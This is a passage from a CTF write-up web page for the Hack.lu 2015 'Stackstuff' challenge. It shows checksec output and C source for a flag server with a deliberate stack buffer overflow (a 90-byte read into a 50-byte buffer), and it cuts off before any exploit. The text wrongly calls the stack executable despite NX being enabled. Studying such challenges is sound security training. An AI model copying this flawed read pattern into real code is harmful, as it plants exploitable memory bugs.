<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon-dark.svg" media="(prefers-color-scheme: light)"><link rel="icon" type="image/svg+xml" href="/favicon.svg" media="(prefers-color-scheme: dark)"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://localhost:3000/writeups/2015-10-24-stackstuff/"><!-- Primary Meta Tags --><title>Hack.lu 2015 - Stackstuff 150</title><meta name="title" content="Hack.lu 2015 - Stackstuff 150"><meta name="description" content="Stuck overflow with PIE"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:3000/writeups/2015-10-24-stackstuff/"><meta property="og:title" content="Hack.lu 2015 - Stackstuff 150"><meta property="og:description" content="Stuck overflow with PIE"><meta property="og:image" content="https://localhost:3000/writeups/2015-10-24-stackstuff/preview.webp"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://localhost:3000/writeups/2015-10-24-stackstuff/"><meta property="twitter:title" content="Hack.lu 2015 - Stackstuff 150"><meta property="twitter:description" content="Stuck overflow with PIE"><meta property="twitter:image" content="https://localhost:3000/preview.webp"><style>:root{--accent: #fea819;--accent-dark: #ac7010;--accent-dark-010: #ac70100a}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.25}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:1em 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:0 .3em;background-color:#1f1f1f;border-radius:.2em;font-size:.8em}pre{padding:1em;border-radius:.2em}pre>code{all:unset;font-size:.8em}blockquote{border-left:4px solid var(--accent);padding:.01em 0 .01em 1em;margin:0;background-color:var(--accent-dark-010)}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}table{border-collapse:collapse;text-align:center}tr{border:1px solid #e9e9e9}th,td{padding:.5em;text-align:center}th{background-color:#1f1f1f;color:#fff}td{background-color:#1b1b1b}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
@media (prefers-color-scheme: dark){.markdown-alert{--color-border-default: #30363d;--color-accent-fg: #58a6ff;--color-accent-emphasis: #1f6feb;--color-danger-fg: #f85149;--color-danger-emphasis: #da3633;--color-attention-fg: #d29922;--color-attention-emphasis: #9e6a03;--color-done-fg: #a371f7;--color-done-emphasis: #8957e5;--color-success-fg: #3fb950;--color-success-emphasis: #238636}}@media (prefers-color-scheme: light){.markdown-alert{--color-border-default: #d0d7de;--color-accent-fg: #0969da;--color-accent-emphasis: #0969da;--color-danger-fg: #d1242f;--color-danger-emphasis: #cf222e;--color-attention-fg: #9a6700;--color-attention-emphasis: #9a6700;--color-done-fg: #8250df;--color-done-emphasis: #8250df;--color-success-fg: #1a7f37;--color-success-emphasis: #1f883d}}.markdown-alert{border-left:.25em solid var(--borderColor-default, var(--color-border-default));color:inherit;margin-bottom:16px;padding:.5rem 1em}.markdown-alert>:last-child{margin-bottom:0!important}.markdown-alert .markdown-alert-title{align-items:center;display:flex;font-size:14px;font-weight:500;line-height:1}.markdown-alert .markdown-alert-title svg.octicon{margin-right:8px!important;margin-right:var(--base-size-8,8px)!important;fill:currentColor}.markdown-alert.markdown-alert-note{border-left-color:var(--borderColor-accent-emphasis,var(--color-accent-emphasis))}.markdown-alert.markdown-alert-note .markdown-alert-title{color:var(--color-accent-fg);color:var(--fgColor-accent,var(--color-accent-fg))}.markdown-alert.markdown-alert-tip{border-left-color:var(--borderColor-success-emphasis,var(--color-success-emphasis))}.markdown-alert.markdown-alert-tip .markdown-alert-title{color:var(--color-success-fg);color:var(--fgColor-success,var(--color-success-fg))}.markdown-alert.markdown-alert-important{border-left-color:var(--borderColor-done-emphasis,var(--color-done-emphasis))}.markdown-alert.markdown-alert-important .markdown-alert-title{color:var(--color-done-fg);color:var(--fgColor-done,var(--color-done-fg))}.markdown-alert.markdown-alert-warning{border-left-color:var(--borderColor-attention-emphasis,var(--color-attention-emphasis))}.markdown-alert.markdown-alert-warning .markdown-alert-title{color:var(--color-attention-fg);color:var(--fgColor-attention,var(--color-attention-fg))}.markdown-alert.markdown-alert-caution{border-left-color:var(--borderColor-danger-emphasis,var(--color-danger-emphasis))}.markdown-alert.markdown-alert-caution .markdown-alert-title{color:var(--color-danger-fg);color:var(--fgColor-danger,var(--color-danger-fg))}main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/hacklu.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2015-10-23T07:00:00.000Z"> Oct 23, 2015 </time>  </div> <h1 data-astro-cid-dxom2xcl>Hack.lu 2015 - Stackstuff 150</h1> <h3 data-astro-cid-dxom2xcl> by Alessandro &quot;q3_C0d3&quot; Guagnelli + ocean</h3> <hr data-astro-cid-dxom2xcl> </div>  <blockquote>
<p>Welcome to the Progressive Secure Coding course! Here, you will learn how to properly secure your software without making it too slow. For example, you should use C. And compile your code for 64bit, because then you don’t need stack cookies, the pointers are random enough.
Test your attack on a box with Linux >=3.4!
Connect to school.fluxfingers.net:1514</p>
</blockquote>
<p>This challenge provided us with the executable and the source code. Let’s analyze the binary and see what we find out:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ file hackme</span></span>
<span class="line"><span>hackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped</span></span>
<span class="line"><span>$ checksec.sh --file hackme</span></span>
<span class="line"><span>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span></span>
<span class="line"><span>No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   hackme</span></span>
<span class="line"><span></span></span></code></pre>
<p>So, we have executable stack, no canary and PIE enabled. We don’t have to decompile the executable, since we are given the source code, and we can easily find the vulnerability:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#758575DD">// gcc -o hackme hackme.c -fPIE -pie -Wall -fomit-frame-pointer</span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">signal.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">unistd.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">string.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdlib.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">sys/socket.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">netinet/in.h</span><span style="color:#C98A7D77">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> PORT</span><span style="color:#4C9A91"> 1514</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#80A665"> negchke</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> n</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> *</span><span style="color:#BD976A">err</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">n </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">    perror</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">err</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    exit</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> n</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">char</span><span style="color:#BD976A"> real_password</span><span style="color:#666666">[</span><span style="color:#4C9A91">50</span><span style="color:#666666">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#80A665"> check_password_correct</span><span style="color:#666666">(</span><span style="color:#CB7676">void</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#CB7676">  char</span><span style="color:#BD976A"> buf</span><span style="color:#666666">[</span><span style="color:#4C9A91">50</span><span style="color:#666666">]</span><span style="color:#666666"> =</span><span style="color:#666666"> {</span><span style="color:#4C9A91">0</span><span style="color:#666666">};</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">  puts</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">To download the flag, you need to specify a password.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  printf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Length of password: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> inlen </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#80A665">scanf</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%d\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">inlen</span><span style="color:#666666">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#758575DD">    // peer probably disconnected?</span></span>
<span class="line"><span style="color:#80A665">    exit</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">inlen </span><span style="color:#CB7676">&#x3C;=</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676"> ||</span><span style="color:#DBD7CAEE"> inlen </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 50</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#758575DD">    // bad input length, fix it</span></span>
<span class="line"><span style="color:#DBD7CAEE">    inlen </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 90</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#80A665">fread</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> inlen</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stdin</span><span style="color:#666666">)</span><span style="color:#CB7676"> !=</span><span style="color:#DBD7CAEE"> inlen</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#758575DD">    // peer disconnected, stop</span></span>
<span class="line"><span style="color:#80A665">    exit</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#4D9375">  return</span><span style="color:#80A665"> strcmp</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> real_password</span><span style="color:#666666">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> require_auth</span><span style="color:#666666">(</span><span style="color:#CB7676">void</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">  while</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#80A665">check_password_correct</span><span style="color:#666666">())</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">    puts</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">bad password, try again</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> handle_request</span><span style="color:#666666">(</span><span style="color:#CB7676">void</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">  alarm</span><span style="color:#666666">(</span><span style="color:#4C9A91">60</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  setbuf</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">  FILE </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">realpw_file </span><span style="color:#666666">=</span><span style="color:#80A665"> fopen</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">password</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">realpw_file </span><span style="color:#CB7676">==</span><span style="color:#4D9375"> NULL</span><span style="color:#CB7676"> ||</span><span style="color:#80A665"> fgets</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">real_password</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">real_password</span><span style="color:#666666">),</span><span style="color:#DBD7CAEE"> realpw_file</span><span style="color:#666666">)</span><span style="color:#CB7676"> ==</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">    fputs</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">unable to read real_password</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stderr</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    exit</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#80A665">  fclose</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">realpw_file</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">  puts</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Hi! This is the flag download service.</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">  require_auth</span><span style="color:#666666">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">  char</span><span style="color:#BD976A"> flag</span><span style="color:#666666">[</span><span style="color:#4C9A91">50</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#DBD7CAEE">  FILE </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">flagfile </span><span style="color:#666666">=</span><span style="color:#80A665"> fopen</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">flag</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">flagfile </span><span style="color:#CB7676">==</span><span style="color:#4D9375"> NULL</span><span style="color:#CB7676"> ||</span><span style="color:#80A665"> fgets</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#666666">),</span><span style="color:#DBD7CAEE"> flagfile</span><span style="color:#666666">)</span><span style="color:#CB7676"> ==</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">    fputs</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">unable to read flag</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> stderr</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#80A665">    exit</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"><span style="color:#80A665">  puts</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> argc</span><span style="color:#666666">,</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">argv</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#80A665">strcmp</span><span style="color:#666666">(</span><span style="color:#BD976A">argv</span><span style="color:#666666">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">],</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">reexec</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#80A665">    handle_request</span><span style="color:#666666">();</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> ssock </span><span style="color:#666666">=</span><span style="color:#80A665"> negchke</span><span style="color:#666666">(</span><span style="color:#80A665">socket</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">AF_INET6</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOCK_STREAM</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to create socket</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#CB7676">  struct</span><span style="color:#DBD7CAEE"> sockaddr_in6 addr </span><span style="color:#666666">=</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">    .sin6_family </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> AF_INET6</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">    .sin6_port </span><span style="color:#666666">=</span><span style="color:#80A665"> htons</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">PORT</span><span style="color:#666666">),</span></span>
<span class="line"><span style="color:#DBD7CAEE">    .sin6_addr </span><span style="color:#666666">=</span><span style="color:#758575DD"> /*IN6ADDR_LOOPBACK_INIT*/</span><span style="color:#DBD7CAEE"> IN6ADDR_ANY_INIT</span></span>
<span class="line"><span style="color:#666666">  };</span></span>
<span class="line"><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> one </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#80A665">  negchke</span><span style="color:#666666">(</span><span style="color:#80A665">setsockopt</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ssock</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOL_SOCKET</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SO_REUSEADDR</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">one</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">one</span><span style="color:#666666">)),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unable to set SO_REUSEADDR</span><span style="color:#C98A7D77">"</span><span style="color:#666666">);</span></span>
